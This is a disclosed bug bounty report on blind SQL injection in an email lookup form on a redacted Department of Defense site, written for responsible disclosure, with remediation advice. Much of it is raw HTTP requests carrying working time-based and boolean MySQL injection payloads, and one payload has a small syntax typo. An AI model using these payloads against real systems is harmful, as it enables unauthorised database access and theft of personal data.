# Blind SQL injection on ████████

## Report Details
- **Report ID**: 313037
- **URL**: https://hackerone.com/reports/313037
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-07T01:37:21.388Z
- **Disclosed**: 2019-10-08T18:56:43.642Z

## Reporter
- **Username**: alyssa_herrera
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
 I discovered that a post request made to https://████████/elist/viewem6.php is vulnerable to SQL injection and is quite clearly vulnerable as I was able to induce a 2 second hang on the web page. Additionally I was able to discover the mysql version with a true/false condition.
**Description:**
 A post request is made to hhttps://████████/elist/viewem6.php  with the following parameters, 
rememail=test@att.net
As to not break the rules of engagement, I used a sleep query and Boolean based commands to clearly and definitively demonstrate the vulnerability and the severity of it.
## Impact
Critical
## Step-by-step Reproduction Instructions
In burp suite we can set a repeater request as followed. Target set as https://████/
POST /elist/viewem6.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://███████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'

Observe a 2 second hang.
vs 

POST /elist/viewem6.php HTTP/1.1
Host: ███
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2b(select*from(select(sleep(0)))a)%2b'

Additionally we can detect version of the mysql by using the following request

POST /elist/viewem6.php HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://██████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'



vs 


POST /elist/viewem6.php HTTP/1.1
Host: ████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2bIF(MID(@@version,1,1)=5sleep(2),1)=2%2b'

We can then discover the version of the DB, we can use queries like this to further discover data.To specify these two queries will demonstrate a true or false query. True scenario will result in the Database sleeping for 2 seconds, false it won't sleep, using this logic, I was able to evaluate if the website's Mysql version started with 4 or 5. As I said above it was possible to escalate from simple time queries to reading data and executing other commands by combing sleep queries with true/false statements.

## Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Sanitize user input and use stored procedures

## Impact

An attacker would be able to read data and steal data in the Database on this website leading to PII leakage and additionally may lead to the website being compromised completely

## Attachments
No attachments
